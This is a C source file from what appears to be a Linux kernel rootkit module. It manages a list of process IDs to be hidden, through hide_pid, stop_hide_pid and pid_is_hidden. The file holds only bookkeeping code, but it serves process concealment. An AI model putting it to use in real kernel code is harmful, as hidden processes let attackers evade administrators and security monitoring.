#include <linux/slab.h>

#include "hidepid.h"
#include "list.h"
#include "log.h"

List_t *__hidden_pid_list = NULL;

void __print_pid(void *param) {
    pid_t pid;

    if (param == NULL) {
        yarr_log("param is NULL");
        return;
    }

    pid = *((pid_t *)param);
    yarr_log("pid: %d", pid);
    return;
}

// TODO: We are returning -1 on errors, -1 also means p1 < p2.
int __cmp_pid(pid_t *p1, pid_t *p2) {
    if (p1 == NULL || p2 == NULL) {
        yarr_log("p1 or p2 are NULL");
        return -1;
    }

    if (*p1 < *p2) {
        return -1;
    } else if (*p1 > *p2) {
        return 1;
    } else {
        return 0;
    }
}

int hide_pid(pid_t pid) {
    pid_t *pid_data;
    int err;

    // First time hidding a pid, create the list.
    if (__hidden_pid_list == NULL) {
        __hidden_pid_list = List_create(
                __print_pid,
                (int (*)(void *, void *))__cmp_pid);
        if (__hidden_pid_list == NULL) {
            yarr_log("Couldn't create __hidden_pid_list");
            return -1;
        }
    }

    // Check if pid is already hidden.
    if (pid_is_hidden(pid)) {
        return 0;
    }

    pid_data = kmalloc(sizeof(pid_t), GFP_KERNEL);
    if (pid_data == NULL) {
        yarr_log("Couldn't allocate memory for pid");
        return -1;
    }

    *pid_data = pid;

    // Add the pid to the list of hidden pids.
    err = List_insertData(__hidden_pid_list, pid_data);
    return err;
}

int stop_hide_pid(pid_t pid) {
    ListItem_t *item;
    int err;

    // Hide pid never requested.
    if (__hidden_pid_list == NULL) {
        return -1;
    }

    item = List_getItemByData(__hidden_pid_list, &pid);
    if (item != NULL) {
        err = List_removeItem(__hidden_pid_list, item);
        if (err) {
            yarr_log("Pid present but List_removeItem() returned error");
            return -1;
        }

        ListItem_destroy(item);
    }

    return 0;
}

int pid_is_hidden(pid_t pid) {
    // Hide pid never requested.
    if (__hidden_pid_list == NULL) {
        return 0;
    }

    return List_itemIsContained(__hidden_pid_list, &pid);
}

